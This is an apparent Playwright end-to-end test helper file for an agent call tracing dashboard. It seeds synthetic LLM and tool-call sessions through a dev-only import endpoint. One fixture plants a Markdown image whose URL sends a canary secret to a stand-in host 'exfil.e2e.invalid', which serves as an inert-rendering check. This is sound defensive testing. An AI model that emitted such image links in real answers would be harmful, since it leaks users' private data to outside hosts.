import { Page, expect } from '@playwright/test';
import { randomUUID } from 'crypto';
import { config } from '../config';

/**
 * Agent Call Tracing e2e helpers (jyx.35). Sessions are seeded through the
 * DEVMODE-only JSON v1 import (POST /api/v1/agent-tracing/dev/import), so
 * every spec gets exact, repeatable data: real traffic through a mock
 * upstream cannot produce a 5,000-span session or an inferred client tool
 * deterministically.
 */

export const EXFIL_HOST = 'exfil.e2e.invalid';

let seq = 0;
const hex = (n: number, width: number) => n.toString(16).padStart(width, '0').slice(-width);
const prefix = Math.floor(Math.random() * 0xffff);
export const newTraceId = () => hex(prefix, 4) + hex(++seq, 28);
export const newSpanId = () => hex(prefix, 4) + hex(++seq, 12);

type Json = Record<string, any>;

const iso = (ms: number) => new Date(ms).toISOString();

const totals = (spans: Json[]) => {
  const t = { span_count: spans.length, llm_call_count: 0, tool_call_count: 0, error_count: 0, input_tokens: 0, output_tokens: 0, cost_micros: 0 };
  for (const s of spans) {
    if (s.kind === 'llm_inference') t.llm_call_count++;
    if (s.kind === 'tool_call' || s.kind === 'inferred_client_tool') t.tool_call_count++;
    if (s.status === 'error') t.error_count++;
    t.input_tokens += s.usage?.input_tokens || 0;
    t.output_tokens += s.usage?.output_tokens || 0;
    t.cost_micros += s.usage?.cost_micros || 0;
  }
  return t;
};

const part = (name: string, content: unknown) => ({
  part: name,
  content_state: 'full',
  media_type: 'application/json',
  content: typeof content === 'string' ? content : JSON.stringify(content),
});

interface SessionOptions {
  name?: string;
  appId?: number;
  status?: 'active' | 'closed';
  source?: 'declared' | 'inferred';
  withError?: boolean;
}

/**
 * One closed, declared session with one turn: the model asks for an MCP
 * tool and a client-side tool, both results come back, and the model
 * answers with Markdown holding an external image and a link (the inert
 * rendering check). All content is captured (mode full).
 */
export function conversationSession(opts: SessionOptions = {}): { doc: Json; id: string; secret: string } {
  const id = randomUUID();
  const trace = newTraceId();
  const t0 = Date.now() - 10 * 60_000;
  const secret = `canary-${randomUUID().slice(0, 8)}`;
  const llm1 = newSpanId();
  const tool = newSpanId();
  const client = newSpanId();
  const llm2 = newSpanId();
  const llm = (spanId: string, at: number, extra: Json): Json => ({
    span_id: spanId,
    trace_id: trace,
    kind: 'llm_inference',
    name: 'chat gpt-4o',
    start_time: iso(at),
    end_time: iso(at + 800),
    status: 'ok',
    provider: 'openai',
    operation: 'chat',
    request_model: 'gpt-4o',
    response_model: 'gpt-4o-2024-08-06',
    usage: { input_tokens: 120, output_tokens: 30, cost_micros: 900 },
    inferred: false,
    content_state: 'full',
    ...extra,
  });
  const spans: Json[] = [
    llm(llm1, t0, {
      tool_call_ids: ['call_search', 'call_shell'],
      finish_reasons: ['tool_calls'],
      parts: [
        part('request', { messages: [{ role: 'user', content: `Find the forecast for Paris ${secret}` }] }),
        part('response', {
          choices: [{ message: { role: 'assistant', content: 'Let me look that up.', tool_calls: [
            { id: 'call_search', type: 'function', function: { name: 'search', arguments: '{"q":"Paris forecast"}' } },
            { id: 'call_shell', type: 'function', function: { name: 'shell', arguments: '{"cmd":"date"}' } },
          ] } }],
        }),
      ],
    }),
    {
      span_id: tool,
      trace_id: trace,
      parent_span_id: llm1,
      parent_confidence: 'strong',
      parent_rule: 'mcp_name_args',
      kind: 'tool_call',
      name: 'tools/call search',
      start_time: iso(t0 + 900),
      end_time: iso(t0 + 1300),
      status: 'ok',
      operation: 'tools/call',
      tool_name: 'search',
      tool_call_ids: ['call_search'],
      inferred: false,
      content_state: 'full',
      parts: [part('tool_args', { q: 'Paris forecast' }), part('tool_result', 'Sunny, 24 degrees')],
    },
    {
      span_id: client,
      trace_id: trace,
      parent_span_id: llm1,
      parent_confidence: 'exact',
      parent_rule: 'tool_call_id',
      kind: 'inferred_client_tool',
      name: 'execute_tool shell',
      start_time: iso(t0 + 800),
      end_time: iso(t0 + 1500),
      status: 'ok',
      operation: 'execute_tool',
      tool_name: 'shell',
      tool_call_ids: ['call_shell'],
      inferred: true,
      content_state: 'not_captured',
      attributes: { 'tyk.duration.upper_bound': true },
    },
    llm(llm2, t0 + 1600, {
      status: opts.withError ? 'error' : 'ok',
      error_type: opts.withError ? 'upstream_error' : undefined,
      finish_reasons: ['stop'],
      parts: [
        part('request', { messages: [{ role: 'user', content: 'Find the forecast for Paris' }, { role: 'tool', tool_call_id: 'call_search', content: 'Sunny, 24 degrees' }] }),
        part('response', {
          choices: [{ message: { role: 'assistant', content:
            `It is **sunny** in Paris. ![chart](https://${EXFIL_HOST}/c.png?d=${secret}) See [the source](https://${EXFIL_HOST}/src) for details.` } }],
        }),
      ],
    }),
  ];
  for (const s of spans) if (s.error_type === undefined) delete s.error_type;
  const end = t0 + 2400;
  const tt = totals(spans);
  const doc = {
    media_type: 'application/vnd.tyk.agent-trace+json; v=1',
    version: 1,
    scope: 'session',
    content_included: true,
    session: {
      id,
      app_id: opts.appId ?? 1,
      user_id: 1,
      source: opts.source ?? 'declared',
      external_id: `e2e-${id.slice(0, 8)}`,
      external_source: 'x-tyk-session-id',
      name: opts.name ?? `e2e triage ${id.slice(0, 8)}`,
      status: opts.status ?? 'closed',
      started_at: iso(t0),
      last_activity_at: iso(end),
      ended_at: opts.status === 'active' ? undefined : iso(end),
      totals: { ...tt, turn_count: 1, currency: 'USD' },
      min_confidence: 'exact',
      sampled: true,
      content_mode: 'full',
    },
    agents: [],
    traces: [{ trace_id: trace, turn_index: 0, source: 'tyk', root_span_id: llm1, started_at: iso(t0), ended_at: iso(end), status: opts.withError ? 'error' : 'ok', totals: tt }],
    spans,
  };
  if (doc.session.ended_at === undefined) delete (doc.session as Json).ended_at;
  return { doc, id, secret };
}

/**
 * A metadata-only session of about `spanCount` spans: turns of an LLM call
 * asking for a tool, the tool call, and the LLM call that answers.
 */
export function largeSession(spanCount: number): { doc: Json; id: string } {
  const id = randomUUID();
  const t0 = Date.now() - 60 * 60_000;
  const spans: Json[] = [];
  const traces: Json[] = [];
  let at = t0;
  for (let turn = 0; spans.length < spanCount; turn++) {
    const trace = newTraceId();
    const turnSpans: Json[] = [];
    const a = newSpanId();
    const tool = newSpanId();
    const b = newSpanId();
    const callId = `call_${turn}`;
    const base = { trace_id: trace, status: 'ok', inferred: false, content_state: 'not_captured' };
    turnSpans.push({ ...base, span_id: a, kind: 'llm_inference', name: 'chat gpt-4o', start_time: iso(at), end_time: iso(at + 300), provider: 'openai', operation: 'chat', request_model: 'gpt-4o', response_model: 'gpt-4o', tool_call_ids: [callId], finish_reasons: ['tool_calls'], usage: { input_tokens: 50, output_tokens: 10, cost_micros: 100 } });
    turnSpans.push({ ...base, span_id: tool, parent_span_id: a, parent_confidence: 'exact', parent_rule: 'tool_call_id', kind: 'tool_call', name: 'tools/call lookup', start_time: iso(at + 320), end_time: iso(at + 400), operation: 'tools/call', tool_name: 'lookup', tool_call_ids: [callId] });
    turnSpans.push({ ...base, span_id: b, kind: 'llm_inference', name: 'chat gpt-4o', start_time: iso(at + 420), end_time: iso(at + 700), provider: 'openai', operation: 'chat', request_model: 'gpt-4o', response_model: 'gpt-4o', finish_reasons: ['stop'], usage: { input_tokens: 60, output_tokens: 12, cost_micros: 120 } });
    traces.push({ trace_id: trace, turn_index: turn, source: 'tyk', root_span_id: a, started_at: iso(at), ended_at: iso(at + 700), status: 'ok', totals: totals(turnSpans) });
    spans.push(...turnSpans);
    at += 1000;
  }
  const doc = {
    media_type: 'application/vnd.tyk.agent-trace+json; v=1',
    version: 1,
    scope: 'session',
    content_included: false,
    session: {
      id,
      app_id: 1,
      user_id: 1,
      source: 'declared',
      external_id: `e2e-large-${id.slice(0, 8)}`,
      external_source: 'x-tyk-session-id',
      name: `e2e large ${id.slice(0, 8)}`,
      status: 'closed',
      started_at: iso(t0),
      last_activity_at: iso(at),
      ended_at: iso(at),
      totals: { ...totals(spans), turn_count: traces.length, currency: 'USD' },
      min_confidence: 'exact',
      sampled: true,
      content_mode: 'off',
    },
    agents: [],
    traces,
    spans,
  };
  return { doc, id };
}

/** Headers the CSRF middleware needs on state-changing page.request calls. */
export async function csrfHeaders(page: Page): Promise<Record<string, string>> {
  const origin = new URL(config.base_url).origin;
  const originHeaders = { Origin: origin, Referer: `${origin}/` };
  const csrf = await page.request.get(`${config.api_url}/csrf-token`, { headers: originHeaders });
  return { ...originHeaders, 'X-CSRF-Token': csrf.headers()['x-csrf-token'] || '' };
}

/** Imports a JSON v1 session document; the page must be logged in as an admin. */
export async function importSession(page: Page, doc: Json): Promise<string> {
  const res = await page.request.post(`${config.api_url}/api/v1/agent-tracing/dev/import`, {
    headers: { ...(await csrfHeaders(page)), 'Content-Type': 'application/json' },
    data: doc,
  });
  expect(res.status(), await res.text()).toBe(201);
  return (await res.json()).session_id;
}

/** Creates a verified user holding only the named system role. */
export async function createUserWithRole(page: Page, roleName: string, email: string, password: string): Promise<void> {
  const roles = await page.request.get(`${config.api_url}/api/v1/rbac/roles`);
  expect(roles.ok(), await roles.text()).toBeTruthy();
  const list: Json[] = (await roles.json()).data;
  const role = list.find((r) => (r.attributes?.name ?? r.name) === roleName);
  expect(role, `role ${roleName}`).toBeTruthy();
  const res = await page.request.post(`${config.api_url}/api/v1/users`, {
    headers: { ...(await csrfHeaders(page)), 'Content-Type': 'application/json' },
    data: {
      data: {
        type: 'users',
        attributes: {
          email,
          name: `${roleName} e2e`,
          password,
          email_verified: true,
          role_ids: [Number(role!.id)],
        },
      },
    },
  });
  expect(res.status(), await res.text()).toBeLessThan(300);
}
